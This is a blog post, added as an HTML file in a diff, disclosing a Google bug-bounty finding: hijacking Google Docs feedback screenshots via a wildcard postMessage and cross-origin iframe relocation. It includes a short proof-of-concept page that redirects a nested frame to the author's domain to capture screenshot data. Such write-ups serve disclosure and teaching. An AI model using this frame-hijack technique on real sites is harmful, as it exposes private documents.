@@ -1,0 +1,299 @@
+<!DOCTYPE html>
+<html lang="en-us"><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
+<meta http-equiv="content-type" content="text/html">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<title itemprop="name">[Google VRP] Hijacking Google Docs Screenshots | Geekycat Blog</title>
+<meta property="og:title" content="[Google VRP] Hijacking Google Docs Screenshots | Geekycat Blog" />
+<meta name="twitter:title" content="[Google VRP] Hijacking Google Docs Screenshots | Geekycat Blog" />
+<meta itemprop="name" content="[Google VRP] Hijacking Google Docs Screenshots | Geekycat Blog" />
+<meta name="application-name" content="[Google VRP] Hijacking Google Docs Screenshots | Geekycat Blog" />
+<meta property="og:site_name" content="" />
+
+<meta name="description" content="">
+<meta itemprop="description" content="" />
+<meta property="og:description" content="" />
+<meta name="twitter:description" content="" />
+
+<meta property="og:locale" content="en-us" />
+<meta name="language" content="en-us" />
+
+  <link rel="alternate" hreflang="en" href="http://localhost:1313/posts/hijacking-google-docs-screenshots/" title="" />
+
+
+
+
+
+    
+    
+    
+
+    <meta property="og:type" content="article" />
+    <meta property="og:article:published_time" content=2020-12-27T19:13:19&#43;0530 />
+    <meta property="article:published_time" content=2020-12-27T19:13:19&#43;0530 />
+    <meta property="og:url" content="http://localhost:1313/posts/hijacking-google-docs-screenshots/" />
+
+    
+    <meta property="og:article:author" content="Sreeram KL" />
+    <meta property="article:author" content="Sreeram KL" />
+    <meta name="author" content="Sreeram KL" />
+    
+    
+
+    
+
+    <script defer type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "Article",
+        "headline": "[Google VRP] Hijacking Google Docs Screenshots",
+        "author": {
+        "@type": "Person",
+        "name": ""
+        },
+        "datePublished": "2020-12-27",
+        "description": "",
+        "wordCount":  714 ,
+        "mainEntityOfPage": "True",
+        "dateModified": "2020-12-27",
+        "image": {
+        "@type": "imageObject",
+        "url": ""
+        },
+        "publisher": {
+        "@type": "Organization",
+        "name": "Geekycat Blog"
+        }
+    }
+    </script>
+
+
+<meta name="generator" content="Hugo 0.123.7">
+
+    
+    <meta property="og:title" content="[Google VRP] Hijacking Google Docs Screenshots" />
+<meta property="og:description" content="Brief: I was able to hijack Google Docs screenshot of any document exploiting postmessage misconfiguration and a browser behavior.
+Google have a feature called &ldquo;Send Feedback&rdquo; in most of their product. As the name suggests it helps Google to get feedback from users when they face some issue. The feature have an options to add screenshots with a brief description about the issue.
+As this is a common feature available in most of their sites, they have deployed the functionality in https://www." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="http://localhost:1313/posts/hijacking-google-docs-screenshots/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2020-12-27T19:13:19+05:30" />
+<meta property="article:modified_time" content="2020-12-27T19:13:19+05:30" />
+
+
+
+    
+    <meta name="twitter:card" content="summary"/><meta name="twitter:title" content="[Google VRP] Hijacking Google Docs Screenshots"/>
+<meta name="twitter:description" content="Brief: I was able to hijack Google Docs screenshot of any document exploiting postmessage misconfiguration and a browser behavior.
+Google have a feature called &ldquo;Send Feedback&rdquo; in most of their product. As the name suggests it helps Google to get feedback from users when they face some issue. The feature have an options to add screenshots with a brief description about the issue.
+As this is a common feature available in most of their sites, they have deployed the functionality in https://www."/>
+
+
+    
+
+    <link rel="canonical" href="http://localhost:1313/posts/hijacking-google-docs-screenshots/">
+    <link href="/style.min.2d921c18cf1ec555ffc03d59a8adc211c402c68c930c27d6a0c306ab175a8d09.css" rel="stylesheet">
+    <link href="/code-highlight.min.706d31975fec544a864cb7f0d847a73ea55ca1df91bf495fd12a177138d807cf.css" rel="stylesheet">
+
+    
+    <link rel="apple-touch-icon" sizes="180x180" href="/icons/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="/icons/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/icons/favicon-16x16.png">
+    <link rel="mask-icon" href="/icons/safari-pinned-tab.svg">
+    <link rel="shortcut icon" href="/favicon.ico">
+
+
+
+
+<link rel="manifest" href="http://localhost:1313/site.webmanifest">
+
+<meta name="msapplication-config" content="/browserconfig.xml">
+<meta name="msapplication-TileColor" content="#2d89ef">
+<meta name="theme-color" content="#434648">
+
+    
+    <link rel="icon" type="image/svg+xml" href="/icons/favicon.svg">
+
+    
+    
+</head>
+<body data-theme = "dark" class="notransition">
+
+<script src="/js/theme.js"></script>
+
+<div class="navbar" role="navigation">
+    <nav class="menu" aria-label="Main Navigation">
+        <a href="http://localhost:1313/" class="logo">
+            <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" 
+viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" 
+stroke-linejoin="round" class="feather feather-home">
+<title></title>
+<path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"></path>
+<polyline points="9 22 9 12 15 12 15 22"></polyline>
+</svg>
+        </a>
+        <input type="checkbox" id="menu-trigger" class="menu-trigger" />
+        <label for="menu-trigger">
+            <span class="menu-icon">
+                <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" stroke="currentColor" fill="none" viewBox="0 0 14 14"><title>Menu</title><path stroke-linecap="round" stroke-linejoin="round" d="M10.595 7L3.40726 7"></path><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 3.51488L3.49301 3.51488"></path><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 10.4851H3.49301"></path><path stroke-linecap="round" stroke-linejoin="round" d="M0.5 12.5V1.5C0.5 0.947715 0.947715 0.5 1.5 0.5H12.5C13.0523 0.5 13.5 0.947715 13.5 1.5V12.5C13.5 13.0523 13.0523 13.5 12.5 13.5H1.5C0.947715 13.5 0.5 13.0523 0.5 12.5Z"></path></svg>
+            </span>
+        </label>
+
+        <div class="trigger">
+            <ul class="trigger-container">
+                
+                
+                <li>
+                    <a class="menu-link " href="/">
+                        Home
+                    </a>
+                    
+                </li>
+                
+                <li>
+                    <a class="menu-link active" href="/posts/">
+                        Posts
+                    </a>
+                    
+                </li>
+                
+                <li class="menu-separator">
+                    <span>|</span>
+                </li>
+                
+                
+            </ul>
+            <a id="mode" href="#">
+                <svg xmlns="http://www.w3.org/2000/svg" class="mode-sunny" width="21" height="21" viewBox="0 0 14 14" stroke-width="1">
+<title>LIGHT</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></circle><line x1="7" y1="0.5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="0.5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line></g></svg>
+                <svg xmlns="http://www.w3.org/2000/svg" class="mode-moon" width="21" height="21" viewBox="0 0 14 14" stroke-width="1">
+<title>DARK</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></circle><line x1="7" y1="0.5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="0.5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line></g></svg>
+            </a>
+        </div>
+    </nav>
+</div>
+
+<div class="wrapper post">
+    <main class="page-content" aria-label="Content">
+        <article>
+            <header class="header">
+                <h1 class="header-title">[Google VRP] Hijacking Google Docs Screenshots</h1>
+                
+                
+                
+                <div class="post-meta">
+                    <time datetime="2020-12-27T19:13:19&#43;05:30" itemprop="datePublished"> Dec 27, 2020 </time>
+                </div>
+                
+            </header>
+            
+            <div class="page-content">
+                <h2 id="brief">Brief:</h2>
+<p>I was able to hijack Google Docs screenshot of any document exploiting postmessage misconfiguration and a browser behavior.</p>
+<p>Google have a feature called &ldquo;Send Feedback&rdquo; in most of their product. As the name suggests it helps Google to get feedback from users when they face some issue. The feature have an options to add screenshots with a brief description about the issue.</p>
+<p><img src="/images/gvrp-sc-hijack/feedback.png" alt="feedback"></p>
+<p>As this is a common feature available in most of their sites, they have deployed  the functionality in <code>https://www.google.com</code> and have integrated to other domains via Iframe.</p>
+<h2 id="working">Working:</h2>
+<p>Let us imagine using Google Docs (<code>https://docs.google.com/document</code>), to submit a feedback we can navigate to <code>Help</code>&ndash;&gt; <code>Send Feedback</code>. Then you&rsquo;ll see a Iframe popping up and magically loading the screenshot of the document you were working on. As the origin of the iframe (<code>www.google.com</code>) is different from the Google docs (<code>docs.google.com</code>) there must be someway of cross origin communication to successfully render the screenshot. PostMessage, comes into the play! The work flow is like, Google docs sends RGB values of its every pixels to the main iframe <a href="https://www.google.com">www.google.com</a>  via postmessage (as  far as I have interpreted). Which redirect those RGB values to its iframe <code>feedback.googleusercontent.com</code>  via postmessage. Which then renders an image from those pixels and sends back it&rsquo;s base64 encoded data-URI to the main Iframe.</p>
+<p>Once this process is finished, we have to write a description for the feedback and on clicking send the description with the image (data-uri) is sent to <code>https://www.google.com</code> (Submit Feedback) via postmessage.</p>
+<p><img src="/images/gvrp-sc-hijack/drawing.jpg" alt="feedback"></p>
+<h2 id="hunting-for-bugs">Hunting for bugs:</h2>
+<p>The first thought I had after understanding this functionality was to find an XSS in the sandbox domain <code>feedback.googleusercontent.com</code>. Using that XSS I could hijack those RGB values of pixels, render the image and steal the screenshot.  I was pretty sure that I&rsquo;ll find a XSS in that as it was a sandbox domain. But it turns out I couldn&rsquo;t. After trying for few days, I asked <a href="https://twitter.com/S1r1us_">S1r1us</a>
+for help. We tried to find XSS for about 5 days, failed and then gave up. After a week, I noticed this video by  <a href="https://twitter.com/filedescriptor">filedescriptor</a> in my twitter feed. (I&rsquo;m a fan of Intigriti&rsquo;s twitter handle and their XSS challenges)</p>
+
+<div style="position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden;">
+  <iframe src="https://www.youtube.com/embed/KpkrTUHoWsQ" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;" allowfullscreen title="YouTube Video"></iframe>
+</div>
+
+<p>After watching the video, I learned a new trick that I didn&rsquo;t knew before. That is, you can change the location of an iframe  which is present in cross origin domain (If it lacks X-Frame-Header). For example, if abc.com have efg.com as iframe and abc.com didn&rsquo;t have X-Frame header, I could change the efg.com to <code>evil.com</code> cross origin using, frames.location</p>
+<p>Now I was thinking of ways to exploit this behavior. What if I tried to replace those iframes in feedback feature to my domain? would it send the postmessage data to me? I decided to give a try. I tired replacing the <code>feedback.googleusercontent.com</code> domain with <code>geekycat.in</code>, it FAILED.</p>
+<p>While the data is sent to <code>feedback.googleusercontent.com</code> it is sent like</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="nx">windowRef</span><span class="p">.</span><span class="nx">postmessage</span><span class="p">(</span><span class="s2">&#34;&lt;Data&gt;&#34;</span><span class="p">,</span><span class="s2">&#34;https://feedback.googleusercontent.com&#34;</span><span class="p">);</span>
+</span></span></code></pre></div><p>So even if I change the iframe&rsquo;s location the data won&rsquo;t be sent to my domain because of the mismatch in postmessage configuration. With no hope I tried changing the (Submit Feedback <code>www.google.com</code>) iframe to my domain and this time it worked! Why?</p>
+<p>The final postmessage on submitting feedback was configured like, <code>windowRef.postmessage(&quot;&lt;Data&gt;&quot;,&quot;*&quot;);</code> as there is no domain check the browser happily sent the data to my domain, which I was able to capture and hijack the screenshot.</p>
+<p>But wait! I said the parent domain shouldn&rsquo;t have X-Frame header, how am I going to achieve that? Luckily Google docs didn&rsquo;t have one. Yes! it still doesn&rsquo;t have. Before flooding Google with your clickjacking reports, note that the site have some other protection against clickjacking like, most options are disabled when embedded in Iframe.</p>
+<p>This behavior is referenced in this Liveoverflow video.</p>
+
+<div style="position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden;">
+  <iframe src="https://www.youtube.com/embed/aCexqB9qi70" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;" allowfullscreen title="YouTube Video"></iframe>
+</div>
+
+<h2 id="exploit">Exploit:</h2>
+<p>Put it together.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">html</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">iframe</span> <span class="na">src</span><span class="o">=</span><span class="s">&#34;https://docs.google.com/document/ID&#34;</span> <span class="p">/&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">       <span class="c1">//pseudo code
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        
+</span></span><span class="line"><span class="cl">        
+</span></span><span class="line"><span class="cl">        <span class="nx">setTimeout</span><span class="p">(</span><span class="kd">function</span><span class="p">(){</span> <span class="nx">exp</span><span class="p">();</span> <span class="p">},</span> <span class="mi">6000</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="kd">function</span> <span class="nx">exp</span><span class="p">(){</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">setInterval</span><span class="p">(</span><span class="kd">function</span><span class="p">(){</span> 
+</span></span><span class="line"><span class="cl">         <span class="nb">window</span><span class="p">.</span><span class="nx">frames</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="nx">frame</span><span class="p">[</span><span class="mi">0</span><span class="p">][</span><span class="mi">2</span><span class="p">].</span><span class="nx">location</span><span class="o">=</span><span class="s2">&#34;https://geekycat.in/exploit.html&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">},</span> <span class="mi">100</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
+</span></span></code></pre></div><p>The function is called after setTimeout of 6 seconds is to give time for the iframe to load. Another issue is, the iframe is created only if user explicitly clicks on the send feedback option. So we have to try to change the location of iframe every 100 ms even when it is not present to ensure the frame is hijacked when it is created.</p>
+<h2 id="video-poc">Video POC</h2>
+
+<div style="position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden;">
+  <iframe src="https://www.youtube.com/embed/isM-BXj4_80" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;" allowfullscreen title="YouTube Video"></iframe>
+</div>
+
+<p>Thanks :)</p>
+
+            </div>
+        </article></main>
+</div>
+<footer class="footer">
+    <span class="footer_item"> </span>
+    &nbsp;
+
+    <div class="footer_social-icons">
+<a href="https://github.com/geeky-cat" target="_blank" rel="noopener noreferrer me"
+    title="Github">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+    stroke-linecap="round" stroke-linejoin="round">
+    <path
+        d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22">
+    </path>
+</svg>
+</a>
+<a href="https://twitter.com/kl_sree" target="_blank" rel="noopener noreferrer me"
+    title="Twitter">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+    stroke-linecap="round" stroke-linejoin="round">
+    <path
+        d="M23 3a10.9 10.9 0 0 1-3.14 1.53 4.48 4.48 0 0 0-7.86 3v1A10.66 10.66 0 0 1 3 4s-4 9 5 13a11.64 11.64 0 0 1-7 2c9 5 20 0 20-11.5a4.5 4.5 0 0 0-.08-.83A7.72 7.72 0 0 0 23 3z">
+    </path>
+</svg>
+</a>
+</div>
+    <small class="footer_copyright">
+        © 2024 Sreeram KL.
+        
+    </small>
+</footer><a href="#" title="" id="totop">
+    <svg xmlns="http://www.w3.org/2000/svg" width="48" height="48" fill="currentColor" stroke="currentColor" viewBox="0 96 960 960">
+    <path d="M283 704.739 234.261 656 480 410.261 725.739 656 677 704.739l-197-197-197 197Z"/>
+</svg>
+
+</a>
+
+
+    
+
+
+
+
+
+
+    
+    <script async src="http://localhost:1313/js/main.js" ></script>
+
+    
+
+</body>
+</html>
